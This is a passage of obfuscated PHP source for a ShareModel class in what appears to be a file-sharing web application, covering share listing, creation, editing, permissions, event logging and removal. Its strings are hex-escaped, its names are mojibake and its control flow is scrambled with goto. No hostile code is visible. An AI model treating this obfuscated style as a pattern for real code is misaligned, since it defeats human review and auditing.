public function clearTimeout() { return $this->where($_SERVER[ä°„ä°º][1847] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\x65"; protected $dataAuto = array(array("\155\x6f\x64\x69\146\171\124\x69\155\x65", "\x74\151\x6d\x65", "\x69\156\x73\x65\162\x74\x2c\165\160\x64\141\x74\x65", "\146\x75\156\143\164\151\157\156"), array("\x63\162\145\141\164\x65\x54\151\155\145", "\164\151\155\145", "\x69\x6e\x73\145\x72\x74", "\x66\165\x6e\143\164\151\x6f\156"), array("\x6f\160\164\151\157\156\x73", '', "\151\x6e\163\145\x72\x74\x2c\x75\160\144\141\164\145\x2c\163\x65\154\145\143\x74", "\x6a\x73\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($C“±ˆõ¼óà) { $d¨‘„¸Ú¬ =& $_SERVER[ä°„ä°º]; $FœÃè†Ô„ï = isset($C“±ˆõ¼óà[0]) ? $C“±ˆõ¼óà[0] : !1; return array($d¨‘„¸Ú¬[1848] => array(USER_ID, $d¨‘„¸Ú¬[1849]), $d¨‘„¸Ú¬[1792] => array($FœÃè†Ô„ï, $d¨‘„¸Ú¬[1850])); } protected function listSimple() { $a¶ˆ§¿ÓÙÄ = array($_SERVER[ä°„ä°º][1551] => USER_ID); $aˆ¢ °¾„ = $this->field($this->fieldList)->where($a¶ˆ§¿ÓÙÄ)->select(); return $aˆ¢ °¾„ ? $aˆ¢ °¾„ : array(); } protected function getInfo($cÉ…ÛÒøØÀ, $D¿‰§öä¿Å = false) { $D¢Ô–æŞî™ =& $_SERVER[ä°„ä°º]; if ($D¿‰§öä¿Å) { return $this->_getShareInfo(array($D¢Ô–æŞî™[468] => $cÉ…ÛÒøØÀ)); } $e¿ÑÏÚõÕÕ = $this->cacheFunctionGet($D¢Ô–æŞî™[1799], $cÉ…ÛÒøØÀ); return $e¿ÑÏÚõÕÕ; } public function getInfoByHash($D«ÌĞ«Æáï) { return $this->_getShareInfo(array($_SERVER[ä°„ä°º][470] => $D«ÌĞ«Æáï)); } public function getInfoByPath($eì²æõñø›) { $B»²²ŞÊôß =& $_SERVER[ä°„ä°º]; $Fğ×ƒïÌ = array($B»²²ŞÊôß[1551] => USER_ID, $B»²²ŞÊôß[395] => $eì²æõñø›); return $this->_getShareInfo($Fğ×ƒïÌ); } public function getInfoBySourcePath($bã£Ì–Ø£½) { $EëÇğ³ =& $_SERVER[ä°„ä°º]; $b–›øš‘÷ß = array($EëÇğ³[1551] => USER_ID, $EëÇğ³[1092] => $bã£Ì–Ø£½); return $this->_getShareInfo($b–›øš‘÷ß); } private function _getShareInfo($F‹Ñ£­ŠÕ¾) { goto E‚«´Â‘ñ; FÜâÒ˜­ˆ: if ($Fæ¶ŞÂ¦‘»[$F·°—Â£ÔÄ[395]] == $F·°—Â£ÔÄ[191]) { $Fæ¶ŞÂ¦‘»[$F·°—Â£ÔÄ[85]] = IO::info($Fæ¶ŞÂ¦‘»[$F·°—Â£ÔÄ[1092]]); } else { $Fæ¶ŞÂ¦‘»[$F·°—Â£ÔÄ[85]] = Model($F·°—Â£ÔÄ[1227])->pathInfo($Fæ¶ŞÂ¦‘»[$F·°—Â£ÔÄ[395]]); } $Fæ¶ŞÂ¦‘»[$F·°—Â£ÔÄ[1852]] = $a¡åãø; return $Fæ¶ŞÂ¦‘»; goto CÌ‰ù”©š; E‚«´Â‘ñ: $F·°—Â£ÔÄ =& $_SERVER[ä°„ä°º]; $Fæ¶ŞÂ¦‘» = $this->where($F‹Ñ£­ŠÕ¾)->find(); if (!$Fæ¶ŞÂ¦‘») { return !1; } goto e‹ö‚“‘Ì; e‹ö‚“‘Ì: $F‹Ñ£­ŠÕ¾ = array($F·°—Â£ÔÄ[468] => $Fæ¶ŞÂ¦‘»[$F·°—Â£ÔÄ[468]]); $d¼ë¦‡‰ò = $F·°—Â£ÔÄ[1851]; $a¡åãø = Model($F·°—Â£ÔÄ[577])->order($F·°—Â£ÔÄ[393])->field($d¼ë¦‡‰ò)->where($F‹Ñ£­ŠÕ¾)->select(); goto FÜâÒ˜­ˆ; CÌ‰ù”©š: } protected function getInfoAuth($Bô£¼–®) { $dõ·×–ŞĞ =& $_SERVER[ä°„ä°º]; $f¸¬®¢…œÅ = $this->getInfo($Bô£¼–®); $f¸¬®¢…œÅ[$dõ·×–ŞĞ[406]] = Model($dõ·×–ŞĞ[482])->authMake($f¸¬®¢…œÅ[$dõ·×–ŞĞ[1852]]); return $f¸¬®¢…œÅ; } protected function listData($bßÜõ‚¿…“ = null, $E±ïÀÌÕˆ› = 300) { $bÉ©ƒ¯ˆ½ =& $_SERVER[ä°„ä°º]; $DƒĞ¸İ©²™ = array(array($bÉ©ƒ¯ˆ½[473] => array($bÉ©ƒ¯ˆ½[991], 0), $bÉ©ƒ¯ˆ½[475] => array($bÉ©ƒ¯ˆ½[991], 0), $bÉ©ƒ¯ˆ½[1853] => $bÉ©ƒ¯ˆ½[1807])); if ($bßÜõ‚¿…“ == $bÉ©ƒ¯ˆ½[1854]) { $DƒĞ¸İ©²™ = array($bÉ©ƒ¯ˆ½[473] => 1); } else { if ($bßÜõ‚¿…“ == $bÉ©ƒ¯ˆ½[1077]) { $DƒĞ¸İ©²™ = array($bÉ©ƒ¯ˆ½[475] => 1); } } $DƒĞ¸İ©²™[$bÉ©ƒ¯ˆ½[1551]] = USER_ID; $eêÓˆë°Ê = $this->where($DƒĞ¸İ©²™)->selectPage($E±ïÀÌÕˆ›); return $eêÓˆë°Ê; } protected function listToMe($bİ“÷çÊ¦‘ = 300) { goto E˜®‹®ßÔ‚; Dó‡Æñ : if ($d†“ôğ«ïä) { $eÏêåÔ¿«‡ = array(array($Eîõƒå†š[562] => SourceModel::TYPE_USER, $Eîõƒå†š[484] => USER_ID), array($Eîõƒå†š[562] => SourceModel::TYPE_GROUP, $Eîõƒå†š[484] => array($Eîõƒå†š[7], $d†“ôğ«ïä)), $Eîõƒå†š[1853] => $Eîõƒå†š[1807]); } $føé¾Š’Ã‘ = Model($Eîõƒå†š[577])->where($eÏêåÔ¿«‡)->selectPage($bİ“÷çÊ¦‘); $CÉ–’Ä¹± = array_to_keyvalue_group($føé¾Š’Ã‘[$Eîõƒå†š[367]], $Eîõƒå†š[468]); goto fååë´Ù«¨; E˜®‹®ßÔ‚: $Eîõƒå†š =& $_SERVER[ä°„ä°º]; $d†“ôğ«ïä = Model($Eîõƒå†š[1855])->userGroupParents(USER_ID); $eÏêåÔ¿«‡ = array($Eîõƒå†š[562] => SourceModel::TYPE_USER, $Eîõƒå†š[484] => USER_ID); goto Dó‡Æñ ; b…æîàÒÏ½: $fšÊ¶ĞáÄ– = $this->field($a å™ºæ Ù)->where($eÏêåÔ¿«‡)->select(); foreach ($fšÊ¶ĞáÄ– as $bŞ©“­Ñ• => &$d²Ï™¼†å) { $d²Ï™¼†å[$Eîõƒå†š[1852]] = $CÉ–’Ä¹±[$d²Ï™¼†å[$Eîõƒå†š[468]]]; } unset($d²Ï™¼†å); goto cï°Êº³’·; fååë´Ù«¨: if (!$CÉ–’Ä¹±) { return $føé¾Š’Ã‘; } $a å™ºæ Ù = $Eîõƒå†š[1856]; $eÏêåÔ¿«‡ = array($Eîõƒå†š[468] => array($Eîõƒå†š[411], array_keys($CÉ–’Ä¹±)), $Eîõƒå†š[1551] => array($Eîõƒå†š[993], $Eîõƒå†š[191])); goto b…æîàÒÏ½; cï°Êº³’·: $aÚßö¸¬É = array($Eîõƒå†š[1857] => $fšÊ¶ĞáÄ–, $Eîõƒå†š[1858] => $føé¾Š’Ã‘[$Eîõƒå†š[364]]); return $aÚßö¸¬É; goto e…¯‚‹í¿½; e…¯‚‹í¿½: } protected function shareAdd($E¦èÚøÊÁ÷, $CœË‡ŞÎˆ¤) { $bî«†ªËğÅ =& $_SERVER[ä°„ä°º]; $dŒ£Í¡È  = $this->_addShareData($E¦èÚøÊÁ÷, $CœË‡ŞÎˆ¤); if (!empty($CœË‡ŞÎˆ¤[$bî«†ªËğÅ[1859]])) { $this->_shareAuthSet($dŒ£Í¡È , $CœË‡ŞÎˆ¤[$bî«†ªËğÅ[1859]]); } $this->shareEventAdd($E¦èÚøÊÁ÷, $CœË‡ŞÎˆ¤, $bî«†ªËğÅ[1080]); return $dŒ£Í¡È ; } protected function shareAddSystem($EªºğĞ”™Ó, $FÁŒá“ˆÉŒ) { $DÂÁœ³Õç =& $_SERVER[ä°„ä°º]; $E”Œ‰¾»š = $this->_addShareData($EªºğĞ”™Ó, $FÁŒá“ˆÉŒ, $DÂÁœ³Õç[1192]); $this->_shareAuthSet($E”Œ‰¾»š, $FÁŒá“ˆÉŒ[$DÂÁœ³Õç[1859]]); return $E”Œ‰¾»š; } private function shareEventAdd($b÷±ÏÎœìõ, $DÅœ¨°§Õè, $DöšÊ•¥Ì = "\x61\144\144") { goto F¾¯µ‡®ã…; A˜öË·³â¾: $Bîè²ë„‚İ = $this->getInfoByPath($b÷±ÏÎœìõ); $EÉÑ›ÉØÍ = $Eîà·ÕêÕÄ[1862]; if ($Bîè²ë„‚İ[$Eîà·ÕêÕÄ[473]] == $Eîà·ÕêÕÄ[191] && $DÅœ¨°§Õè[$Eîà·ÕêÕÄ[473]] == $Eîà·ÕêÕÄ[87]) { $EÉÑ›ÉØÍ = $Eîà·ÕêÕÄ[1860]; } goto CéŠ®Æ÷›; F¾¯µ‡®ã…: $Eîà·ÕêÕÄ =& $_SERVER[ä°„ä°º]; if (!$b÷±ÏÎœìõ || $b÷±ÏÎœìõ == $Eîà·ÕêÕÄ[191]) { return; } if ($DöšÊ•¥Ì == $Eîà·ÕêÕÄ[1080]) { if ($DÅœ¨°§Õè[$Eîà·ÕêÕÄ[473]] == $Eîà·ÕêÕÄ[87]) { Model($Eîà·ÕêÕÄ[546])->eventShare($b÷±ÏÎœìõ, $Eîà·ÕêÕÄ[1860]); } if ($DÅœ¨°§Õè[$Eîà·ÕêÕÄ[475]] == $Eîà·ÕêÕÄ[87]) { Model($Eîà·ÕêÕÄ[546])->eventShare($b÷±ÏÎœìõ, $Eîà·ÕêÕÄ[1861]); } return; } goto A˜öË·³â¾; CéŠ®Æ÷›: if ($Bîè²ë„‚İ[$Eîà·ÕêÕÄ[473]] == $Eîà·ÕêÕÄ[87] && $DÅœ¨°§Õè[$Eîà·ÕêÕÄ[473]] == $Eîà·ÕêÕÄ[191]) { $EÉÑ›ÉØÍ = $Eîà·ÕêÕÄ[1863]; } if ($Bîè²ë„‚İ[$Eîà·ÕêÕÄ[475]] == $Eîà·ÕêÕÄ[191] && $DÅœ¨°§Õè[$Eîà·ÕêÕÄ[475]] == $Eîà·ÕêÕÄ[87]) { $EÉÑ›ÉØÍ = $Eîà·ÕêÕÄ[1861]; } if ($Bîè²ë„‚İ[$Eîà·ÕêÕÄ[475]] == $Eîà·ÕêÕÄ[87] && $DÅœ¨°§Õè[$Eîà·ÕêÕÄ[475]] == $Eîà·ÕêÕÄ[191]) { $EÉÑ›ÉØÍ = $Eîà·ÕêÕÄ[1864]; } goto BÔÇ·ÃªóÚ; BÔÇ·ÃªóÚ: Model($Eîà·ÕêÕÄ[546])->eventShare($b÷±ÏÎœìõ, $EÉÑ›ÉØÍ); return; goto Eë¤Ì™Š¹; Eë¤Ì™Š¹: } private function _addShareData($a½‚ˆ¿Ğñ, $a†÷ÒäéÙ = array(), $a ñâõöï = false) { goto DÈÔØ›‹š£; C¯‡ëŒ«Ş›: if (!$a†÷ÒäéÙ[$aÜ¢¨Ü‘¼ã[1454]]) { $a†÷ÒäéÙ[$aÜ¢¨Ü‘¼ã[1454]] = $c‰å‘Ç”ñõ[$aÜ¢¨Ü‘¼ã[28]]; } $a’¥ñâ­ÌŸ = array($aÜ¢¨Ü‘¼ã[1542] => $bŞÇ¥Õ¶ˆø, $aÜ¢¨Ü‘¼ã[410] => $a½‚ˆ¿Ğñ, $aÜ¢¨Ü‘¼ã[1454] => $aÜ¢¨Ü‘¼ã[33], $aÜ¢¨Ü‘¼ã[473] => 0, $aÜ¢¨Ü‘¼ã[475] => 0, $aÜ¢¨Ü‘¼ã[1092] => $aÜ¢¨Ü‘¼ã[33], $aÜ¢¨Ü‘¼ã[305] => $aÜ¢¨Ü‘¼ã[33], $aÜ¢¨Ü‘¼ã[871] => $aÜ¢¨Ü‘¼ã[33], $aÜ¢¨Ü‘¼ã[1866] => 0, $aÜ¢¨Ü‘¼ã[1867] => 0, $aÜ¢¨Ü‘¼ã[476] => 0, $aÜ¢¨Ü‘¼ã[477] => $aÜ¢¨Ü‘¼ã[33], $aÜ¢¨Ü‘¼ã[470] => $aÜ¢¨Ü‘¼ã[33]); $bßİ¼å…Â = explode($aÜ¢¨Ü‘¼ã[47], $aÜ¢¨Ü‘¼ã[1868]); goto bÃ±“­Á¾; bÉÕ÷…Æ: $this->where(array($aÜ¢¨Ü‘¼ã[467] => $d‹¼á¯³óÓ))->save($FÕÍà‡–ñÇ); return $d‹¼á¯³óÓ; goto a¨±³Šö–­; bÃ±“­Á¾: foreach ($bßİ¼å…Â as $A¼Ê÷ùù›Ÿ) { if (!isset($a†÷ÒäéÙ[$A¼Ê÷ùù›Ÿ])) { continue; } $a’¥ñâ­ÌŸ[$A¼Ê÷ùù›Ÿ] = $a†÷ÒäéÙ[$A¼Ê÷ùù›Ÿ]; } $d‹¼á¯³óÓ = $this->add($a’¥ñâ­ÌŸ); $FÕÍà‡–ñÇ = array($aÜ¢¨Ü‘¼ã[470] => short_id($d‹¼á¯³óÓ)); goto bÉÕ÷…Æ; DÈÔØ›‹š£: $aÜ¢¨Ü‘¼ã =& $_SERVER[ä°„ä°º]; $bŞÇ¥Õ¶ˆø = $a ñâõöï == $aÜ¢¨Ü‘¼ã[1192] ? 0 : USER_ID; $E…Åî‘‹ì² = array($aÜ¢¨Ü‘¼ã[410] => $a½‚ˆ¿Ğñ, $aÜ¢¨Ü‘¼ã[1542] => $bŞÇ¥Õ¶ˆø); goto A¨–çÆ’±œ; A¨–çÆ’±œ: if ($a½‚ˆ¿Ğñ == 0) { $E…Åî‘‹ì² = array($aÜ¢¨Ü‘¼ã[1865] => $a†÷ÒäéÙ[$aÜ¢¨Ü‘¼ã[1092]], $aÜ¢¨Ü‘¼ã[1542] => $bŞÇ¥Õ¶ˆø); } if ($c±àªˆƒĞ = $this->where($E…Åî‘‹ì²)->find()) { return $c±àªˆƒĞ[$aÜ¢¨Ü‘¼ã[468]]; } if ($a½‚ˆ¿Ğñ == 0) { $c‰å‘Ç”ñõ = array($aÜ¢¨Ü‘¼ã[28] => get_path_this($a†÷ÒäéÙ[$aÜ¢¨Ü‘¼ã[76]])); } else { $c‰å‘Ç”ñõ = Model($aÜ¢¨Ü‘¼ã[813])->sourceInfo($a½‚ˆ¿Ğñ); if (!$c‰å‘Ç”ñõ) { return !1; } } goto C¯‡ëŒ«Ş›; a¨±³Šö–­: } private function _shareAuthSet($DÏíƒ²Š‰, $AŸ¯Ğ™¹À) { goto d©»¤İš†Ç; dËÙø‘–„: $eÕÑÈ‹›ê->where(array($e»‘Ëàª°[468] => $DÏíƒ²Š‰))->delete(); $aœŸ½½Îµ = array(); foreach ($AŸ¯Ğ™¹À as $FßÅÓàŸÃî) { $bÖ­Ê†×“ò = SourceModel::TYPE_USER; if ($FßÅÓàŸÃî[$e»‘Ëàª°[404]] == SourceModel::TYPE_GROUP) { $bÖ­Ê†×“ò = SourceModel::TYPE_GROUP; } $fŒ”Æ”£ó = array($e»‘Ëàª°[468] => $DÏíƒ²Š‰, $e»‘Ëàª°[404] => $bÖ­Ê†×“ò, $e»‘Ëàª°[484] => intval($FßÅÓàŸÃî[$e»‘Ëàª°[484]]), $e»‘Ëàª°[1815] => 0, $e»‘Ëàª°[1869] => -1); if ($FßÅÓàŸÃî[$e»‘Ëàª°[1815]]) { $fŒ”Æ”£ó[$e»‘Ëàª°[1815]] = $FßÅÓàŸÃî[$e»‘Ëàª°[1815]]; } else { if ($FßÅÓàŸÃî[$e»‘Ëàª°[1869]]) { $fŒ”Æ”£ó[$e»‘Ëàª°[1869]] = $FßÅÓàŸÃî[$e»‘Ëàª°[1869]]; } } $aœŸ½½Îµ[] = $fŒ”Æ”£ó; } goto e…îÛ¡Â£; d©»¤İš†Ç: $e»‘Ëàª° =& $_SERVER[ä°„ä°º]; if (!is_array($AŸ¯Ğ™¹À)) { return !1; } $eÕÑÈ‹›ê = Model($e»‘Ëàª°[1819]); goto dËÙø‘–„; e…îÛ¡Â£: return $eÕÑÈ‹›ê->addAll($aœŸ½½Îµ, array(), !0); goto c°Íœ–œ¡; c°Íœ–œ¡: } public function numViewAdd($Eã·šå‡ß) { $E¨˜–¿‚É… =& $_SERVER[ä°„ä°º]; $D—ì‹ÀÎÑ = array($E¨˜–¿‚É…[467] => $Eã·šå‡ß); $this->where($D—ì‹ÀÎÑ)->setAdd($E¨˜–¿‚É…[1866]); } public function numDownloadAdd($E¡Ë·é‘Ù½) { $cÒˆ…ÔîŒ¹ =& $_SERVER[ä°„ä°º]; $fïòÏš¹Õ = array($cÒˆ…ÔîŒ¹[467] => $E¡Ë·é‘Ù½); $this->where($fïòÏš¹Õ)->setAdd($cÒˆ…ÔîŒ¹[1867]); } protected function shareEdit($fÓââ˜ÎÆ, $bë¢àì‚¤ç) { goto b‘æùÆÄÚ´; BÅ‚æ­Ö×Û: if (isset($bë¢àì‚¤ç[$Fø§‘ñá¨ø[1859]])) { $this->_shareAuthSet($fÓââ˜ÎÆ, $bë¢àì‚¤ç[$Fø§‘ñá¨ø[1859]]); } return !0; goto A¨”³­†Ö ; bãƒäƒô†÷: $this->_checkLinkShare($bë¢àì‚¤ç, $CÆÄ”ó“); $e³Ÿï¶â‘ = array(); $Dİ­õ¨îĞ• = explode($Fø§‘ñá¨ø[47], $Fø§‘ñá¨ø[1870]); goto aÛ‹ Î«µ²; b‘æùÆÄÚ´: $Fø§‘ñá¨ø =& $_SERVER[ä°„ä°º]; $CÆÄ”ó“ = $this->getInfo($fÓââ˜ÎÆ); if (!$CÆÄ”ó“) { return !1; } goto bãƒäƒô†÷; aÛ‹ Î«µ²: foreach ($Dİ­õ¨îĞ• as $c«Ä¦ÖÄ‰) { if (!array_key_exists($c«Ä¦ÖÄ‰, $bë¢àì‚¤ç)) { continue; } $e³Ÿï¶â‘[$c«Ä¦ÖÄ‰] = $bë¢àì‚¤ç[$c«Ä¦ÖÄ‰]; } $this->shareEventAdd($CÆÄ”ó“[$Fø§‘ñá¨ø[395]], $bë¢àì‚¤ç, $Fø§‘ñá¨ø[1687]); $this->where(array($Fø§‘ñá¨ø[467] => $fÓââ˜ÎÆ))->save($e³Ÿï¶â‘); goto BÅ‚æ­Ö×Û; A¨”³­†Ö : } private function _checkLinkShare($aá¶²Óƒ£, $aï×ŒªĞàí) { goto FÈ›ë’¶ã; DÈ…İ‘¢Ç: $cËØ„Ğ²Ü‡ = $this->shareFileMeta($dÌÚÔŠÁˆ[$BŠ²ÛøæçÕ[447]]); if (isset($cËØ„Ğ²Ü‡[$BŠ²ÛøæçÕ[372]]) && $cËØ„Ğ²Ü‡[$BŠ²ÛøæçÕ[372]] == $BŠ²ÛøæçÕ[87]) { show_json(LNG($BŠ²ÛøæçÕ[1873]), !1); } goto b›“Ø„“‡÷; FÈ›ë’¶ã: $BŠ²ÛøæçÕ =& $_SERVER[ä°„ä°º]; if ($aá¶²Óƒ£[$BŠ²ÛøæçÕ[473]] != $BŠ²ÛøæçÕ[87]) { return; } $b¾Â°êÕĞ = $aï×ŒªĞàí[$BŠ²ÛøæçÕ[85]][$BŠ²ÛøæçÕ[395]]; goto F‚Å¸¼†­; F‚Å¸¼†­: if ($aï×ŒªĞàí[$BŠ²ÛøæçÕ[85]][$BŠ²ÛøæçÕ[29]] != $BŠ²ÛøæçÕ[193]) { $cÓ­‡¦¥Úä = $this->_folderReport($b¾Â°êÕĞ); if (!$cÓ­‡¦¥Úä) { return; } show_json(LNG($BŠ²ÛøæçÕ[1871]) . $BŠ²ÛøæçÕ[1872] . $cÓ­‡¦¥Úä, !1); } $dÌÚÔŠÁˆ = Model($BŠ²ÛøæçÕ[813])->fileInfoGet($aï×ŒªĞàí[$BŠ²ÛøæçÕ[85]][$BŠ²ÛøæçÕ[395]]); if (!$dÌÚÔŠÁˆ) { return; } goto DÈ…İ‘¢Ç; b›“Ø„“‡÷: } private function _folderReport($Eèæ™­à¢) { goto BÎ‹Ù¬äì; e»Ö·¤òâ˜: $f¹ÖÙ´¹Öõ = substr($BÉôİã³š[$eš¨³ØŞ©[502]], strpos($BÉôİã³š[$eš¨³ØŞ©[502]], $Dƒ˜’¯³Ï)); $Bµ°ªî‰Ğ§ = array($eš¨³ØŞ©[395] => array($eš¨³ØŞ©[7], trim($f¹ÖÙ´¹Öõ, $eš¨³ØŞ©[47]))); $aùòš¢¾•ˆ = Model($eš¨³ØŞ©[813])->where($Bµ°ªî‰Ğ§)->field($eš¨³ØŞ©[28])->select(); goto B•ãÎö›¤; BÎ‹Ù¬äì: $eš¨³ØŞ© =& $_SERVER[ä°„ä°º]; $Bµ°ªî‰Ğ§ = array($eš¨³ØŞ©[447] => array($eš¨³ØŞ©[991], 0), $eš¨³ØŞ©[733] => 3); $dÛèÒ™à¬á = Model($eš¨³ØŞ©[1874])->where($Bµ°ªî‰Ğ§)->field($eš¨³ØŞ©[447])->select(); goto bÄÅÁ©ƒïÔ; D¶‚ö«ã›«: $Bµ°ªî‰Ğ§ = array($eš¨³ØŞ©[447] => array($eš¨³ØŞ©[7], $dÛèÒ™à¬á), $eš¨³ØŞ©[502] => array($eš¨³ØŞ©[380], "\45{$Dƒ˜’¯³Ï}\45"), $eš¨³ØŞ©[423] => 0); $BÉôİã³š = Model($eš¨³ØŞ©[813])->where($Bµ°ªî‰Ğ§)->field($eš¨³ØŞ©[1875])->find(); if (!$BÉôİã³š) { return !1; } goto e»Ö·¤òâ˜; bÄÅÁ©ƒïÔ: if (!$dÛèÒ™à¬á) { return !1; } $dÛèÒ™à¬á = array_to_keyvalue($dÛèÒ™à¬á, $eš¨³ØŞ©[33], $eš¨³ØŞ©[447]); $Dƒ˜’¯³Ï = $eš¨³ØŞ©[47] . $Eèæ™­à¢ . $eš¨³ØŞ©[47]; goto D¶‚ö«ã›«; B•ãÎö›¤: $e‰¶Ö¶«è = array_to_keyvalue($aùòš¢¾•ˆ, $eš¨³ØŞ©[33], $eš¨³ØŞ©[28]); $e‰¶Ö¶«è[] = $BÉôİã³š[$eš¨³ØŞ©[28]]; return implode($eš¨³ØŞ©[8], $e‰¶Ö¶«è); goto A½Åò‹°Ú®; A½Åò‹°Ú®: } protected function remove($d¡ãŒ¹»ÕÒ) { goto a“†»Íì¶; DÎŠÄõÏÒĞ: $C˜×èëˆíÊ = $this->where($bù¡ Æ‘)->delete(); if ($C˜×èëˆíÊ) { Model($eïºÀÉÀ•¼[577])->where(array($eïºÀÉÀ•¼[468] => $d¡ãŒ¹»ÕÒ))->delete(); } $AâîøÑôã = is_array($d¡ãŒ¹»ÕÒ) ? $d¡ãŒ¹»ÕÒ[1] : array($d¡ãŒ¹»ÕÒ); goto Cí „ŸŠó‡; a“†»Íì¶: $eïºÀÉÀ•¼ =& $_SERVER[ä°„ä°º]; if (is_array($d¡ãŒ¹»ÕÒ)) { $d¡ãŒ¹»ÕÒ = array($eïºÀÉÀ•¼[7], $d¡ãŒ¹»ÕÒ); } $bù¡ Æ‘ = array($eïºÀÉÀ•¼[468] => $d¡ãŒ¹»ÕÒ); goto DÎŠÄõÏÒĞ; Cí „ŸŠó‡: for ($b­»¦æòà = 0; $b­»¦æòà < count($AâîøÑôã); $b­»¦æòà++) { $Aíœí‰Õğ = $this->getInfo($AâîøÑôã[$b­»¦æòà]); if ($Aíœí‰Õğ[$eïºÀÉÀ•¼[475]] == $eïºÀÉÀ•¼[87]) { Model($eïºÀÉÀ•¼[546])->eventShare($Aíœí‰Õğ[$eïºÀÉÀ•¼[395]], $eïºÀÉÀ•¼[1864]); } if ($Aíœí‰Õğ[$eïºÀÉÀ•¼[473]] == $eïºÀÉÀ•¼[87]) { Model($eïºÀÉÀ•¼[546])->eventShare($Aíœí‰Õğ[$eïºÀÉÀ•¼[395]], $eïºÀÉÀ•¼[1863]); } } return $C˜×èëˆíÊ; goto C¶ì¯—ŒØ; C¶ì¯—ŒØ: } protected function removeBySource($E“œÎº†ç) { goto CùŠñÊ‹; a‚–ÌƒÛÆ‰: $this->where($bêÑÆÖè‹)->delete(); Model($A’»É‹¤Ë[577])->where($bêÑÆÖè‹)->delete(); goto e£¥Úæä; c³‰ƒ‰¥Ñƒ: $d—õÑƒô—İ = array_to_keyvalue($d—õÑƒô—İ, $A’»É‹¤Ë[33], $A’»É‹¤Ë[468]); if (!$d—õÑƒô—İ) { return; } $bêÑÆÖè‹ = array($A’»É‹¤Ë[467] => array($A’»É‹¤Ë[411], $d—õÑƒô—İ)); goto a‚–ÌƒÛÆ‰; CùŠñÊ‹: $A’»É‹¤Ë =& $_SERVER[ä°„ä°º]; $bêÑÆÖè‹ = array($A’»É‹¤Ë[410] => array($A’»É‹¤Ë[411], $E“œÎº†ç)); $d—õÑƒô—İ = $this->field($A’»É‹¤Ë[468])->where($bêÑÆÖè‹)->select(); goto c³‰ƒ‰¥Ñƒ; e£¥Úæä: } public function listAll($d¿†Ş•Ùšï) { goto cÍ„ÖÑ˜¬‡; cÍ„ÖÑ˜¬‡: $FæÅ‚ˆ‚¥ =& $_SERVER[ä°„ä°º]; $f¯»¯äİÇ” = array(); if ($d¿†Ş•Ùšï[$FæÅ‚ˆ‚¥[1551]]) { $f¯»¯äİÇ”[$FæÅ‚ˆ‚¥[1551]] = $d¿†Ş•Ùšï[$FæÅ‚ˆ‚¥[1551]]; } goto d´‡¾µºÀ; d´‡¾µºÀ: if ($d¿†Ş•Ùšï[$FæÅ‚ˆ‚¥[744]]) { $C«¦–ÃºÎ = $d¿†Ş•Ùšï[$FæÅ‚ˆ‚¥[476]] ? $d¿†Ş•Ùšï[$FæÅ‚ˆ‚¥[476]] : strtotime(date($FæÅ‚ˆ‚¥[1876])); $f¯»¯äİÇ”[$FæÅ‚ˆ‚¥[194]] = array($FæÅ‚ˆ‚¥[331], array($d¿†Ş•Ùšï[$FæÅ‚ˆ‚¥[744]], $C«¦–ÃºÎ)); } if ($d¿†Ş•Ùšï[$FæÅ‚ˆ‚¥[29]]) { $f¯»¯äİÇ”[$d¿†Ş•Ùšï[$FæÅ‚ˆ‚¥[29]]] = 1; } else { $f¯»¯äİÇ”[] = array($FæÅ‚ˆ‚¥[473] => array($FæÅ‚ˆ‚¥[991], 0), $FæÅ‚ˆ‚¥[475] => array($FæÅ‚ˆ‚¥[991], 0), $FæÅ‚ˆ‚¥[1853] => $FæÅ‚ˆ‚¥[1807]); } if ($d¿†Ş•Ùšï[$FæÅ‚ˆ‚¥[1803]]) { $f¯»¯äİÇ”[] = array($FæÅ‚ˆ‚¥[470] => $d¿†Ş•Ùšï[$FæÅ‚ˆ‚¥[1803]], $FæÅ‚ˆ‚¥[1454] => array($FæÅ‚ˆ‚¥[380], "\x25{$d¿†Ş•Ùšï[$FæÅ‚ˆ‚¥[1803]]}\x25"), $FæÅ‚ˆ‚¥[1853] => $FæÅ‚ˆ‚¥[1807]); } goto aø›ìáˆÚ; aø›ìáˆÚ: $e¿‹ˆßÈ¡ì = $this->_makeOrder()->where($f¯»¯äİÇ”)->selectPage(20); if (empty($e¿‹ˆßÈ¡ì[$FæÅ‚ˆ‚¥[367]])) { return array(); } $this->_listDataApply($e¿‹ˆßÈ¡ì[$FæÅ‚ˆ‚¥[367]]); goto CÀ›×±Ñ; CÀ›×±Ñ: return $e¿‹ˆßÈ¡ì; goto Dµİš¶ß§™; Dµİš¶ß§™: } public function listDataApply($F³ÃÁ´Î•±) { $this->_listDataApply($F³ÃÁ´Î•±); return $F³ÃÁ´Î•±; } private function _listDataApply(&$D¤Çëæ—) { goto BˆÂğ¡äº; a”ÃÁæãÑƒ: unset($d¶»îİİ†„); $D¤Çëæ— = array_values($D¤Çëæ—); goto B¿Á©µ„­è; DáÈéŠæƒ: $b‹çÔ‰ô = array_to_keyvalue($D¤Çëæ—, $D¯óÙ×Ô¥ˆ[33], $D¯óÙ×Ô¥ˆ[395]); $F”©Ê°ïº = Model($D¯óÙ×Ô¥ˆ[813])->sourceListInfo($b‹çÔ‰ô, !0); foreach ($D¤Çëæ— as $bÑò•×êë‡ => &$d¶»îİİ†„) { $aª†ä´÷š = $d¶»îİİ†„[$D¯óÙ×Ô¥ˆ[1551]]; $d¶»îİİ†„[$D¯óÙ×Ô¥ˆ[1877]] = $aÜÔ¯‡Ù[$aª†ä´÷š] ? $aÜÔ¯‡Ù[$aª†ä´÷š] : !1; $E‹®æ˜Ú = $d¶»îİİ†„[$D¯óÙ×Ô¥ˆ[395]]; $d¶»îİİ†„[$D¯óÙ×Ô¥ˆ[85]] = $F”©Ê°ïº[$E‹®æ˜Ú] ? $F”©Ê°ïº[$E‹®æ˜Ú] : !1; if ($d¶»îİİ†„[$D¯óÙ×Ô¥ˆ[85]][$D¯óÙ×Ô¥ˆ[423]] == $D¯óÙ×Ô¥ˆ[87]) { unset($D¤Çëæ—[$bÑò•×êë‡]); } if ($d¶»îİİ†„[$D¯óÙ×Ô¥ˆ[85]] != $D¯óÙ×Ô¥ˆ[191] && !$d¶»îİİ†„[$D¯óÙ×Ô¥ˆ[85]]) { unset($D¤Çëæ—[$bÑò•×êë‡]); } } goto a”ÃÁæãÑƒ; BˆÂğ¡äº: $D¯óÙ×Ô¥ˆ =& $_SERVER[ä°„ä°º]; $E˜ÇÜˆ–À = array_to_keyvalue($D¤Çëæ—, 